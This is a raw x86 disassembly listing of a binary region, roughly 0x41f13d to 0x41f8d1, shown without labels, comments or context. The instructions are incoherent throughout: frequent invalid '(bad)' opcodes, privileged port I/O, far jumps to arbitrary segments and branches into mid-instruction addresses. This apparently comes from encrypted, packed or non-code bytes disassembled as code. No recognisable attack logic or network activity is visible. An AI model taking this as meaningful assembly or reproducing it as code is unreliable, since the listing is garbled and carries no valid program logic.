  41f13d:	std    
  41f13e:	or     ecx,DWORD PTR [edx-0x25446cc]
  41f144:	xor    ebp,ebp
  41f146:	mov    ch,0xf9
  41f148:	jnp    0x41f0d0
  41f14a:	int    0x9e
  41f14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14d:	xor    DWORD PTR ds:0x6fba2552,esp
  41f153:	test   al,0x99
  41f155:	mov    esi,0x85bdab39
  41f15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f15b:	call   0xb1bb7065
  41f160:	pop    ss
  41f161:	mov    esp,0x7d630256
  41f166:	sub    BYTE PTR [eax-0x4d3ea4b6],0x76
  41f16d:	jp     0x41f1eb
  41f16f:	xchg   edx,eax
  41f170:	push   esi
  41f171:	push   es
  41f172:	cwde   
  41f173:	mov    cl,0xd9
  41f175:	pop    edi
  41f176:	mov    ah,0x64
  41f178:	xchg   ecx,edi
  41f17a:	aaa    
  41f17b:	in     eax,dx
  41f17c:	and    al,0x84
  41f17e:	xlat   BYTE PTR ds:[ebx]
  41f17f:	mov    al,0x64
  41f181:	push   es
  41f182:	(bad)  
  41f183:	lea    esp,cs:[eax-0x23705f87]
  41f18a:	fs and eax,0xc5a5a9de
  41f190:	mov    dl,0x62
  41f192:	mov    ecx,0x599aac9c
  41f197:	adc    ah,BYTE PTR [eax]
  41f199:	inc    esp
  41f19a:	(bad)  
  41f19c:	dec    esp
  41f19d:	fs out dx,eax
  41f19f:	push   es
  41f1a0:	ins    BYTE PTR es:[edi],dx
  41f1a1:	test   al,0x3b
  41f1a3:	jmp    0xfa28:0x81603b70
  41f1aa:	inc    esi
  41f1ab:	push   ds
  41f1ac:	icebp  
  41f1ad:	(bad)  
  41f1ae:	push   ss
  41f1af:	(bad)  
  41f1b0:	fsub   st(3),st
  41f1b2:	add    DWORD PTR [ebx+0x4c],0x18218557
  41f1b9:	mov    ah,0xc4
  41f1bb:	jecxz  0x41f18e
  41f1bd:	call   0xec859036
  41f1c2:	(bad)  
  41f1c3:	mov    ah,0x63
  41f1c5:	cmp    esi,DWORD PTR [edi-0x13]
  41f1c8:	rcr    al,cl
  41f1ca:	push   esi
  41f1cb:	out    0x19,eax
  41f1cd:	sub    DWORD PTR [eax-0x35baf3ad],0x151aee1c
  41f1d7:	xor    ah,BYTE PTR [ecx+0x26]
  41f1da:	loopne 0x41f169
  41f1dc:	rcr    BYTE PTR [ebx],cl
  41f1de:	popa   
  41f1df:	mov    al,ds:0x1e3704f4
  41f1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1e5:	and    BYTE PTR [ecx+0x2020abbd],cl
  41f1eb:	in     al,0x3a
  41f1ed:	pop    eax
  41f1ee:	cld    
  41f1ef:	push   ecx
  41f1f0:	push   ecx
  41f1f1:	imul   edx,DWORD PTR [eax+0x1d7cb9b9],0xd
  41f1f8:	add    al,0x5a
  41f1fa:	jo     0x41f271
  41f1fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1fd:	push   esp
  41f1fe:	push   0x860c4a41
  41f203:	mov    dl,0xb5
  41f205:	es in  al,0x8d
  41f208:	cs (bad) 
  41f20a:	or     eax,0x42dd8818
  41f20f:	or     al,0xbd
  41f211:	mov    edx,0xd3ed2c52
  41f216:	iret   
  41f217:	mov    edi,0x88545a41
  41f21c:	cmp    al,0x41
  41f21e:	pop    esp
  41f21f:	pushw  ss
  41f221:	cmp    al,0x58
  41f223:	push   esp
  41f224:	cs (bad) 
  41f226:	ds xor al,0xb8
  41f229:	ja     0x41f29f
  41f22b:	out    0xb,al
  41f22d:	sbb    al,dh
  41f22f:	dec    esi
  41f230:	sub    esi,edx
  41f232:	jbe    0x41f1d6
  41f234:	jmp    0xff3c:0x29723a61
  41f23b:	dec    edi
  41f23c:	jne    0x41f25c
  41f23e:	and    DWORD PTR [ebp-0x5d796130],ebp
  41f244:	shr    bl,cl
  41f246:	ret    0x3581
  41f249:	cwde   
  41f24a:	dec    eax
  41f24b:	ror    BYTE PTR [edx],1
  41f24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24e:	fs repz sar ebp,1
  41f252:	add    eax,0xce60403f
  41f257:	jmp    0x532f:0x44d8e9c3
  41f25e:	push   ss
  41f25f:	pop    esp
  41f260:	mov    esi,0xb253578b
  41f265:	cwde   
  41f266:	and    eax,0x4a433901
  41f26b:	push   esi
  41f26c:	in     al,dx
  41f26d:	dec    ecx
  41f26e:	stos   BYTE PTR es:[edi],al
  41f26f:	sbb    esi,DWORD PTR [eax+0x38c6a8c7]
  41f275:	mov    al,0xb6
  41f277:	ret    0x4e4c
  41f27a:	icebp  
  41f27b:	dec    eax
  41f27c:	inc    ebp
  41f27d:	xor    BYTE PTR [ecx+edx*2+0x25013861],0x85
  41f285:	pop    ds
  41f286:	enter  0xc1da,0xca
  41f28a:	sar    BYTE PTR [eax],cl
  41f28c:	mov    ah,0x92
  41f28e:	nop
  41f28f:	xchg   DWORD PTR [ecx-0x5],esi
  41f292:	inc    ecx
  41f293:	jbe    0x41f233
  41f295:	test   edi,ebp
  41f297:	and    bl,bl
  41f299:	add    ah,BYTE PTR ss:0xbdbee636
  41f2a0:	(bad)  
  41f2a1:	clc    
  41f2a2:	cmp    ebp,eax
  41f2a4:	mov    WORD PTR [edx+0x447adae1],gs
  41f2aa:	push   ds
  41f2ab:	(bad)  
  41f2ac:	xchg   edi,eax
  41f2ad:	sar    BYTE PTR [edx],0x4e
  41f2b0:	lock test eax,0xc24f0042
  41f2b6:	stc    
  41f2b7:	loopne 0x41f2a0
  41f2b9:	adc    BYTE PTR [edx],0x73
  41f2bc:	sub    al,0x74
  41f2bf:	clc    
  41f2c0:	and    dl,BYTE PTR [edx]
  41f2c2:	stc    
  41f2c3:	hlt    
  41f2c4:	rcl    DWORD PTR [edx],cl
  41f2c6:	cmp    al,BYTE PTR [ecx+0x7f]
  41f2c9:	mov    ebp,0x75b768b7
  41f2ce:	mov    ch,0x8f
  41f2d0:	cdq    
  41f2d1:	push   ss
  41f2d2:	int    0x4
  41f2d4:	iret   
  41f2d5:	push   DWORD PTR [ecx+0x2b]
  41f2d8:	mov    bh,0x17
  41f2da:	adc    al,0xaf
  41f2dc:	retf   0x55dc
  41f2df:	cld    
  41f2e0:	out    dx,al
  41f2e1:	cmp    ebx,ebp
  41f2e3:	dec    ebx
  41f2e4:	dec    eax
  41f2e5:	sbb    eax,0x6b073a70
  41f2ea:	popa   
  41f2eb:	repz inc ebp
  41f2ed:	aaa    
  41f2ee:	test   eax,0x890babaf
  41f2f3:	cs dec ebx
  41f2f5:	xor    ch,BYTE PTR es:[ecx-0x364f38b2]
  41f2fc:	dec    ecx
  41f2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2fe:	add    BYTE PTR [edi-0x14],al
  41f301:	mov    edi,0xec54e288
  41f306:	cs xchg ebp,eax
  41f308:	inc    edi
  41f309:	inc    edx
  41f30a:	and    eax,0xa83e2936
  41f30f:	fdiv   DWORD PTR [ebp-0x685d118c]
  41f315:	xchg   BYTE PTR [esi+0x68],dh
  41f318:	add    dh,al
  41f31a:	rcl    BYTE PTR [esi+0x22258f93],cl
  41f320:	loopne 0x41f2a8
  41f322:	dec    ecx
  41f323:	dec    eax
  41f324:	cmc    
  41f325:	(bad)
  41f328:	inc    eax
  41f329:	push   edx
  41f32a:	retf   0x3e1a
  41f32d:	jp     0x41f2ea
  41f32f:	scas   eax,DWORD PTR es:[edi]
  41f330:	fbld   TBYTE PTR [edx]
  41f332:	and    eax,0x64c17a0f
  41f337:	dec    esi
  41f338:	xor    dh,bh
  41f33a:	test   DWORD PTR [edx],eax
  41f33c:	add    al,0x15
  41f33e:	(bad)  
  41f33f:	push   edx
  41f340:	jno    0x41f385
  41f342:	dec    eax
  41f343:	cwde   
  41f344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f345:	inc    esi
  41f346:	retf   
  41f347:	retf   0x9367
  41f34a:	xor    DWORD PTR [ebx],edi
  41f34c:	jle    0x41f370
  41f34e:	popf   
  41f34f:	mov    eax,0x144862b1
  41f354:	inc    DWORD PTR ds:0x58eb9ee4
  41f35a:	sbb    BYTE PTR [eax-0x50c6c9be],ah
  41f360:	call   DWORD PTR [ebx+esi*8]
  41f363:	sub    al,0xd1
  41f365:	pop    ebx
  41f366:	pusha  
  41f367:	aaa    
  41f368:	(bad)  
  41f369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f36a:	dec    edi
  41f36b:	(bad)  
  41f36c:	daa    
  41f36d:	adc    eax,DWORD PTR [ebp-0x71a61]
  41f373:	and    ebx,DWORD PTR [edx+0x41634162]
  41f379:	mov    ds:0xb4653f4b,al
  41f37e:	or     al,bl
  41f380:	test   DWORD PTR [ebp-0x156dcc18],esi
  41f386:	mov    ebx,0xbc2658dd
  41f38b:	mov    ?,WORD PTR [ebx]
  41f38d:	pop    ds
  41f38e:	cdq    
  41f38f:	mov    WORD PTR [edi],es
  41f391:	sbb    BYTE PTR [ecx],cl
  41f393:	add    bl,BYTE PTR [ebp+0x5d9a462c]
  41f399:	ds push esi
  41f39b:	xor    esp,DWORD PTR [ebx+0x3c371673]
  41f3a1:	stc    
  41f3a2:	cwde   
  41f3a3:	ja     0x41f3be
  41f3a5:	(bad)  
  41f3a6:	dec    ebx
  41f3a7:	or     esi,0x997326c0
  41f3ad:	jmp    0xa723c213
  41f3b2:	add    DWORD PTR [edx+edx*4-0x5c],0x3ed7aa32
  41f3ba:	stos   BYTE PTR es:[edi],al
  41f3bb:	retf   0x9e18
  41f3be:	repnz pusha 
  41f3c0:	push   edx
  41f3c1:	push   edx
  41f3c2:	je     0x41f3c1
  41f3c4:	mov    esi,0x730fff56
  41f3c9:	sub    DWORD PTR [edi-0x7a566e26],edx
  41f3cf:	icebp  
  41f3d0:	xchg   BYTE PTR [ebx+0x52],bh
  41f3d3:	ss out dx,eax
  41f3d5:	or     cl,BYTE PTR [ebp+0x28a62328]
  41f3db:	ss or  eax,0x23161319
  41f3e1:	mov    DWORD PTR [ecx],edi
  41f3e3:	jle    0x41f41d
  41f3e5:	cmp    DWORD PTR [ebx-0x554ae6aa],ecx
  41f3eb:	es stc 
  41f3ed:	sbb    BYTE PTR [esp+ebx*1-0x503b62f9],bl
  41f3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3f5:	sbb    eax,esi
  41f3f7:	pop    ds
  41f3f8:	cmp    ecx,DWORD PTR [ecx+0x5d]
  41f3fb:	pcmpeqw mm4,QWORD PTR [eax-0x20]
  41f3ff:	mov    edx,0x920b94ff
  41f404:	loope  0x41f402
  41f406:	xacquire xchg BYTE PTR [ecx+0x3c6a82c2],ch
  41f40d:	add    eax,0x94eff8b4
  41f412:	sbb    DWORD PTR [esi-0x2e],ecx
  41f415:	retf   
  41f416:	scas   al,BYTE PTR es:[edi]
  41f417:	adc    bh,BYTE PTR [ecx+0x1e4e917b]
  41f41d:	icebp  
  41f41e:	sbb    ch,BYTE PTR [edx]
  41f420:	out    0xed,al
  41f422:	aas    
  41f423:	xchg   ecx,eax
  41f424:	mov    dh,0xde
  41f426:	ins    DWORD PTR es:[edi],dx
  41f427:	enter  0xf561,0x39
  41f42b:	cmp    eax,0x84b631eb
  41f430:	out    dx,eax
  41f431:	pop    es
  41f432:	xchg   edi,eax
  41f433:	mov    al,ds:0xd825ccf2
  41f438:	mov    ch,0x61
  41f43a:	outs   dx,BYTE PTR ds:[esi]
  41f43b:	cmp    BYTE PTR [edx-0x41],bl
  41f43e:	dec    esi
  41f43f:	pop    ss
  41f440:	xchg   esi,eax
  41f441:	pusha  
  41f442:	dec    eax
  41f443:	jns    0x41f3d0
  41f445:	loop   0x41f41a
  41f447:	mov    al,0x9a
  41f449:	add    dl,al
  41f44b:	mov    esi,0x104042ed
  41f450:	lahf   
  41f451:	mov    fs,WORD PTR [eax]
  41f453:	ret    
  41f454:	adc    ebx,esi
  41f456:	jb     0x41f42d
  41f458:	jecxz  0x41f460
  41f45a:	xor    DWORD PTR [edx-0x3d],0xffffffd0
  41f45e:	das    
  41f45f:	and    al,0x47
  41f461:	push   edx
  41f462:	les    esp,FWORD PTR [esi+0x4f63a523]
  41f468:	add    edi,ebx
  41f46a:	jo     0x41f489
  41f46c:	fisttp WORD PTR [ebx]
  41f46e:	add    dh,BYTE PTR [eax-0x17]
  41f471:	bound  edi,QWORD PTR [ebx-0x12]
  41f474:	out    0xc6,eax
  41f476:	retf   
  41f477:	sbb    BYTE PTR [edi],ch
  41f479:	jb     0x41f3fd
  41f47b:	and    BYTE PTR [ecx],ch
  41f47d:	fdiv   QWORD PTR [ecx-0x42]
  41f480:	dec    ecx
  41f481:	pop    eax
  41f482:	icebp  
  41f483:	es aam 0x3c
  41f486:	mov    DWORD PTR [esi+0x78],ebx
  41f489:	and    al,0xf4
  41f48b:	jge    0x41f509
  41f48d:	ret    0x5ac5
  41f490:	mov    ebx,DWORD PTR [esp+esi*4+0x6641b128]
  41f497:	jb     0x41f477
  41f499:	mov    esp,0x966db693
  41f49e:	xchg   ecx,eax
  41f49f:	cdq    
  41f4a0:	jmp    0x9a26b2cb
  41f4a5:	popa   
  41f4a6:	pop    ds
  41f4a7:	xchg   ecx,eax
  41f4a8:	jo     0x41f448
  41f4aa:	js     0x41f454
  41f4ac:	call   0xcebb3217
  41f4b1:	scas   al,BYTE PTR es:[edi]
  41f4b2:	and    eax,0x89ea0188
  41f4b7:	int    0x3b
  41f4b9:	add    ebx,DWORD PTR [eax+0x6]
  41f4bc:	call   0x9aeaafc4
  41f4c1:	popa   
  41f4c2:	ds or  ecx,edx
  41f4c5:	inc    esp
  41f4c6:	dec    ebx
  41f4c7:	pushf  
  41f4c8:	sbb    al,0x1e
  41f4ca:	mov    esi,0x8cbdeca5
  41f4cf:	sbb    BYTE PTR [ebp-0xe],bl
  41f4d2:	cmp    al,0xa5
  41f4d4:	mov    ebp,ebp
  41f4d6:	push   0xffffffe0
  41f4d8:	das    
  41f4d9:	sub    esp,edx
  41f4db:	adc    BYTE PTR [edi],al
  41f4dd:	xchg   ecx,eax
  41f4de:	addr16 je 0x41f560
  41f4e1:	clc    
  41f4e2:	jae    0x41f472
  41f4e4:	sub    ebp,esp
  41f4e6:	pop    esi
  41f4e7:	mov    cl,0x94
  41f4e9:	add    cl,BYTE PTR ds:0x3d56607e
  41f4ef:	imul   BYTE PTR [eax-0x4a750da0]
  41f4f5:	jg     0x41f4d2
  41f4f7:	mov    ds:0x6f20025d,al
  41f4fc:	lods   eax,DWORD PTR ds:[esi]
  41f4fd:	mov    gs,esi
  41f4ff:	jle    0x41f4de
  41f501:	add    ecx,DWORD PTR [esi]
  41f503:	sub    eax,DWORD PTR [ebp-0x67421671]
  41f509:	jg     0x41f571
  41f50b:	add    al,0x9e
  41f50d:	aaa    
  41f50e:	adc    edx,esp
  41f510:	in     al,dx
  41f511:	clc    
  41f512:	pop    ecx
  41f513:	jmp    0x41f4f7
  41f515:	out    dx,eax
  41f516:	xor    cl,dl
  41f518:	iret   
  41f519:	aad    0x8b
  41f51b:	aad    0xc6
  41f51d:	dec    ebx
  41f51e:	or     ah,dh
  41f520:	cmc    
  41f521:	out    dx,al
  41f522:	jae    0x41f540
  41f524:	push   eax
  41f525:	dec    ecx
  41f526:	(bad)  
  41f527:	int    0x38
  41f529:	popf   
  41f52a:	aas    
  41f52b:	and    eax,0x4021601
  41f530:	call   0x5691:0x1088452f
  41f537:	(bad)  
  41f538:	pop    ebx
  41f539:	pop    ecx
  41f53a:	add    DWORD PTR [ebp-0x10],ebp
  41f53d:	(bad)  
  41f53e:	sbb    ch,BYTE PTR [ecx+0x4f47b598]
  41f544:	sub    ebp,ecx
  41f546:	jb     0x41f4f8
  41f548:	pop    ebp
  41f549:	iret   
  41f54a:	sbb    esp,esi
  41f54c:	gs xchg esp,eax
  41f54e:	xchg   edi,eax
  41f54f:	pop    edi
  41f550:	icebp  
  41f551:	loop   0x41f583
  41f553:	retf   
  41f554:	inc    edx
  41f555:	inc    eax
  41f556:	jmp    0xeaff3a14
  41f55b:	je     0x41f526
  41f55d:	push   esp
  41f55e:	dec    esi
  41f55f:	mov    dl,0x52
  41f561:	xchg   DWORD PTR [ecx-0x36589682],edx
  41f567:	cmp    DWORD PTR [eax],ebx
  41f569:	xchg   edi,eax
  41f56a:	jp     0x41f520
  41f56c:	in     eax,0x6f
  41f56e:	dec    eax
  41f56f:	or     BYTE PTR [ecx+0x6a],dl
  41f572:	cmc    
  41f573:	loop   0x41f51f
  41f575:	out    dx,al
  41f576:	std    
  41f577:	bound  esp,QWORD PTR [ebx]
  41f579:	in     al,dx
  41f57a:	or     bl,BYTE PTR [esi+0xa9b6f7a]
  41f580:	xchg   esi,eax
  41f581:	sti    
  41f582:	test   eax,0x1676ad37
  41f587:	cmp    DWORD PTR [ebx+ebp*2+0x4],edx
  41f58b:	sub    BYTE PTR [esp+esi*1-0x1a],al
  41f58f:	(bad)  
  41f590:	leave  
  41f591:	jle    0x41f544
  41f593:	js     0x41f5c9
  41f595:	and    dh,dl
  41f597:	in     eax,dx
  41f598:	inc    edi
  41f599:	jmp    FWORD PTR [ebx]
  41f59b:	mov    esi,0x84f246ca
  41f5a0:	mov    ds:0xde469244,eax
  41f5a5:	mov    ebx,0xb1a3166b
  41f5aa:	in     eax,0x78
  41f5ac:	pop    ss
  41f5ad:	outs   dx,DWORD PTR ds:[esi]
  41f5ae:	pop    ebx
  41f5af:	vmulss xmm5,xmm4,xmm6
  41f5b3:	inc    esp
  41f5b4:	xlat   BYTE PTR ds:[ebx]
  41f5b5:	(bad)  
  41f5b6:	adc    al,0x59
  41f5b8:	pushf  
  41f5b9:	or     al,0x1e
  41f5bb:	cmp    DWORD PTR [esi],esi
  41f5bd:	iret   
  41f5be:	pushf  
  41f5bf:	loop   0x41f588
  41f5c1:	cld    
  41f5c2:	jno    0x41f5b3
  41f5c4:	out    dx,eax
  41f5c5:	lods   al,BYTE PTR ds:[esi]
  41f5c6:	mov    ch,0xc6
  41f5c8:	cs dec esi
  41f5ca:	cmp    ah,ch
  41f5cc:	bsf    ebx,DWORD PTR [edi+0x4b]
  41f5d0:	sbb    DWORD PTR [ecx],ebx
  41f5d2:	or     edx,0x57
  41f5d5:	lea    bp,[edi+0x3b2a956d]
  41f5dc:	ss das 
  41f5de:	mov    dh,0xdf
  41f5e0:	mov    eax,ds:0xce41c066
  41f5e5:	into   
  41f5e6:	pop    ds
  41f5e7:	sbb    dh,BYTE PTR [edx-0x56]
  41f5ea:	repnz mov al,0x26
  41f5ed:	sub    al,cl
  41f5ef:	sub    BYTE PTR [esi-0xb1be75f],bl
  41f5f5:	push   esp
  41f5f6:	xchg   ebx,eax
  41f5f7:	les    eax,FWORD PTR [edi+0x53]
  41f5fa:	(bad)  
  41f5fb:	in     eax,0xef
  41f5fd:	imul   esi,DWORD PTR [ecx],0x49
  41f600:	loopne 0x41f5a3
  41f602:	fsubr  st(5),st
  41f604:	and    DWORD PTR [ebp-0x68b3624a],edi
  41f60a:	ins    BYTE PTR es:[edi],dx
  41f60b:	mov    ch,0xa3
  41f60d:	mov    al,0xc7
  41f60f:	clc    
  41f610:	jnp    0x41f5f3
  41f612:	sub    al,0x31
  41f614:	and    al,0x8c
  41f616:	push   0xe0675fb1
  41f61b:	sub    DWORD PTR [eax],edx
  41f61d:	iret   
  41f61e:	in     al,0x18
  41f620:	scas   al,BYTE PTR es:[edi]
  41f621:	not    DWORD PTR [ebx-0x63ea82b6]
  41f627:	inc    ebp
  41f628:	jmp    0x41f688
  41f62a:	xor    al,BYTE PTR [ebx]
  41f62c:	or     eax,0x8cde068c
  41f631:	mov    edx,0xba10e1e5
  41f636:	fild   DWORD PTR [eax]
  41f638:	or     edi,DWORD PTR es:0xb4f72a31
  41f63f:	fs stos DWORD PTR es:[edi],eax
  41f641:	fucom  st(6)
  41f643:	sbb    DWORD PTR [esi-0x173c56e9],edx
  41f649:	ins    BYTE PTR es:[edi],dx
  41f64a:	cmp    eax,0x113f9fcf
  41f64f:	cmp    ah,BYTE PTR [esi]
  41f651:	adc    eax,DWORD PTR [ebx]
  41f653:	inc    esp
  41f654:	sub    bl,ah
  41f656:	mov    ebp,0x7bb4014a
  41f65b:	(bad)  
  41f65d:	pop    esp
  41f65e:	add    ebp,eax
  41f660:	test   eax,0x23d9d6b0
  41f665:	outs   dx,BYTE PTR ds:[esi]
  41f666:	loope  0x41f635
  41f668:	ins    BYTE PTR es:[edi],dx
  41f669:	mov    dl,0x9d
  41f66b:	sub    al,0x2b
  41f66d:	mov    ecx,0xcb371d3b
  41f672:	aad    0x42
  41f674:	in     al,0xe8
  41f676:	sbb    esi,esi
  41f678:	mov    ds:0xceb1d129,ax
  41f67e:	ds in  al,dx
  41f680:	jnp    0x41f630
  41f682:	jnp    0x41f69a
  41f684:	mov    edx,0x6981517
  41f689:	addr16 push 0x62
  41f68c:	pop    edx
  41f68d:	sbb    edi,ebp
  41f68f:	or     ebx,DWORD PTR [edi+esi*1]
  41f692:	pop    ds
  41f693:	retf   0x4273
  41f696:	and    bh,0x6a
  41f699:	sub    eax,0x2a2f2137
  41f69e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f69f:	inc    ecx
  41f6a0:	pusha  
  41f6a1:	inc    esi
  41f6a2:	out    dx,eax
  41f6a3:	xchg   DWORD PTR ds:0xae8bfa42,edx
  41f6a9:	aaa    
  41f6aa:	push   cs
  41f6ab:	push   ebp
  41f6ac:	fnstenv [edi+0x2bb504cd]
  41f6b2:	ins    DWORD PTR es:[edi],dx
  41f6b3:	(bad)  
  41f6b4:	stc    
  41f6b5:	retf   0x9440
  41f6b8:	ins    BYTE PTR es:[edi],dx
  41f6b9:	clflush BYTE PTR [edx+0x3d]
  41f6bd:	xchg   esp,ebx
  41f6bf:	sar    DWORD PTR [ebx],0x4a
  41f6c2:	pop    ebx
  41f6c3:	add    al,0x50
  41f6c5:	enter  0x15cb,0x7e
  41f6c9:	sub    DWORD PTR [eax-0x8],edx
  41f6cc:	mov    ch,0x27
  41f6ce:	and    al,0x62
  41f6d0:	je     0x41f6ef
  41f6d2:	pop    eax
  41f6d3:	jmp    0xfc81e33b
  41f6d8:	ret    0xdeb7
  41f6db:	fdiv   DWORD PTR [esi]
  41f6dd:	mov    eax,ds:0xc3faf4e1
  41f6e2:	mov    edx,DWORD PTR [ebx-0x23]
  41f6e5:	inc    esi
  41f6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6e7:	inc    edx
  41f6e8:	add    eax,0x96488b2b
  41f6ed:	repz mov ds:0x17d49ded,eax
  41f6f3:	sbb    eax,0xdbf31387
  41f6f8:	sbb    al,0xaf
  41f6fa:	add    BYTE PTR [edi+0x4f],0x65
  41f6fe:	(bad)  
  41f6ff:	adc    DWORD PTR [ebp+0x3d],edx
  41f702:	jb     0x41f777
  41f704:	popa   
  41f705:	add    al,0x5d
  41f707:	dec    ebx
  41f708:	call   0x4090:0x9885a6b7
  41f70f:	push   ecx
  41f710:	pop    ecx
  41f711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f712:	es icebp 
  41f714:	fisttp DWORD PTR [eax-0x6c]
  41f717:	sub    BYTE PTR [esi+0x726eb456],bh
  41f71d:	mov    al,dl
  41f71f:	sbb    eax,0x52ef84c0
  41f724:	lahf   
  41f725:	pop    es
  41f726:	or     al,0x40
  41f728:	fld    DWORD PTR ds:0x79028094
  41f72e:	push   0xbb6de110
  41f733:	loop   0x41f6e3
  41f735:	or     ah,al
  41f737:	jne    0x41f796
  41f739:	fidiv  DWORD PTR [ecx-0x1a]
  41f73c:	pop    eax
  41f73d:	sbb    eax,0x6655b9ab
  41f742:	xchg   BYTE PTR [ebp+0x2b36928e],al
  41f748:	push   0xc4eefa13
  41f74d:	ret    
  41f74e:	add    eax,0xd6b53c06
  41f753:	clc    
  41f754:	push   ss
  41f755:	mov    ebx,DWORD PTR [esi]
  41f757:	jge    0x41f6e2
  41f759:	add    al,0x85
  41f75b:	ret    
  41f75c:	pop    es
  41f75d:	sub    DWORD PTR [ecx-0x32],ebp
  41f760:	sub    ecx,DWORD PTR [eax+0x62]
  41f763:	inc    eax
  41f764:	xor    BYTE PTR [edx],ah
  41f766:	push   0x29
  41f768:	push   edx
  41f769:	xchg   cl,dl
  41f76b:	cmp    DWORD PTR [ebx],edi
  41f76d:	arpl   ax,dx
  41f76f:	push   ecx
  41f770:	addr16 pop ebp
  41f772:	sub    al,0xe4
  41f774:	ss test al,0x4b
  41f777:	mov    al,ds:0xbe1d8933
  41f77c:	daa    
  41f77d:	imul   ebp,DWORD PTR [ecx-0x78],0xb5f76ace
  41f784:	mov    ebx,0x340e0da1
  41f789:	jns    0x41f75d
  41f78b:	mov    ds:0xd5f12c,eax
  41f790:	push   eax
  41f791:	sbb    DWORD PTR [ebx],esi
  41f793:	jmp    0xbdeffc77
  41f798:	jge    0x41f7a3
  41f79a:	or     al,0x2f
  41f79c:	in     eax,dx
  41f79d:	sub    dl,bh
  41f79f:	cs and ebp,ebp
  41f7a2:	cmp    esi,ebx
  41f7a4:	or     al,0xdc
  41f7a6:	fstp   QWORD PTR [edx+0x7b72bb20]
  41f7ac:	add    eax,0xfc8c53f8
  41f7b1:	clc    
  41f7b2:	xchg   esi,eax
  41f7b3:	pop    edi
  41f7b4:	lea    eax,[esi+0x7b5eaf95]
  41f7ba:	in     al,dx
  41f7bb:	xchg   esi,eax
  41f7bc:	jecxz  0x41f7ec
  41f7be:	bound  ecx,QWORD PTR [ecx-0x62f388d3]
  41f7c4:	xor    al,ch
  41f7c6:	lahf   
  41f7c7:	push   0xa2e886c9
  41f7cc:	enter  0x3f6b,0x9d
  41f7d0:	pop    ss
  41f7d1:	ja     0x41f839
  41f7d3:	out    dx,al
  41f7d4:	out    0xbb,eax
  41f7d6:	jmp    0xc39a:0xa1f8f605
  41f7dd:	(bad)  
  41f7de:	out    dx,al
  41f7df:	leave  
  41f7e0:	xchg   ebp,eax
  41f7e1:	dec    ecx
  41f7e2:	out    0x3a,eax
  41f7e4:	int3   
  41f7e5:	jp     0x41f843
  41f7e7:	mov    eax,0xdc9b0965
  41f7ec:	sub    eax,esi
  41f7ee:	jl     0x41f83d
  41f7f0:	jmp    0x41f85e
  41f7f2:	add    al,0xbb
  41f7f4:	dec    eax
  41f7f5:	repnz inc edx
  41f7f7:	xor    al,0xf4
  41f7f9:	out    0xb6,al
  41f7fb:	jmp    0x30fe:0xa25f9ca9
  41f802:	inc    edx
  41f803:	or     ebp,DWORD PTR [edx]
  41f805:	xchg   ecx,ebp
  41f807:	fbstp  TBYTE PTR [eax]
  41f809:	sub    al,0xfb
  41f80b:	stc    
  41f80c:	repnz cmp bl,BYTE PTR [esi]
  41f80f:	mov    ch,0xdf
  41f811:	cmp    ah,al
  41f813:	jne    0x41f7e2
  41f815:	in     al,0x3
  41f817:	push   es
  41f818:	jmp    0x41f79f
  41f81a:	ret    0x9c23
  41f81d:	jbe    0x41f86c
  41f81f:	and    eax,0x1bb27181
  41f824:	adc    esi,DWORD PTR [ebx-0x246a78c3]
  41f82a:	jmp    0x41f8a4
  41f82c:	stc    
  41f82d:	and    ecx,DWORD PTR [ecx+esi*8-0x1f]
  41f831:	pop    es
  41f832:	sbb    edi,DWORD PTR [esi]
  41f834:	imul   eax,DWORD PTR [edi],0xa8b7a438
  41f83a:	stos   BYTE PTR es:[edi],al
  41f83b:	test   BYTE PTR [eax+0x1607c333],cl
  41f841:	adc    dl,BYTE PTR [ebx]
  41f843:	jmp    0x41f867
  41f845:	test   DWORD PTR [ecx+0x2eb01813],ebx
  41f84b:	cmp    eax,0x9d5a3719
  41f850:	popa   
  41f851:	daa    
  41f852:	jae    0x41f846
  41f854:	enter  0x8c8f,0xf9
  41f858:	cmp    BYTE PTR [eax-0x3e],0x27
  41f85c:	pop    edi
  41f85d:	cwde   
  41f85e:	pop    ecx
  41f85f:	xor    DWORD PTR [edx],ebx
  41f861:	jmp    0x7130:0xe688cb0f
  41f868:	call   0x202091ab
  41f86d:	dec    edx
  41f86e:	int    0xd2
  41f870:	jle    0x41f84a
  41f872:	mov    al,ds:0xf9c279b8
  41f877:	cld    
  41f878:	test   eax,0xaa4b4470
  41f87d:	arpl   WORD PTR [ecx+0x2841a962],dx
  41f883:	inc    ebx
  41f884:	inc    esi
  41f885:	repnz (bad) 
  41f887:	in     al,dx
  41f888:	mov    ecx,0xf93e1c61
  41f88d:	push   0x2446a45b
  41f892:	push   ebp
  41f893:	je     0x41f8d7
  41f895:	mov    ?,WORD PTR [eax+ebx*1]
  41f898:	sub    DWORD PTR [edx],edx
  41f89a:	shr    ecx,cl
  41f89c:	nop
  41f89d:	in     al,dx
  41f89e:	or     ah,BYTE PTR ds:[ebx+0x29d34adf]
  41f8a5:	int3   
  41f8a6:	mov    esi,0x80792697
  41f8ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8ac:	or     ebp,DWORD PTR [eax-0x7f6adfac]
  41f8b2:	xchg   ah,ah
  41f8b4:	xchg   esi,eax
  41f8b5:	mov    ah,0x66
  41f8b7:	cli    
  41f8b8:	scas   eax,DWORD PTR es:[edi]
  41f8b9:	shl    DWORD PTR [ebp-0x18392a33],cl
  41f8bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8c0:	sbb    cl,BYTE PTR [eax+edx*4]
  41f8c3:	xor    al,0x1b
  41f8c5:	push   0x2dee655b
  41f8ca:	and    al,0xc1
  41f8cc:	rcr    DWORD PTR [edi+0x76],1
  41f8cf:	aam    0xb6
  41f8d1:	hlt    
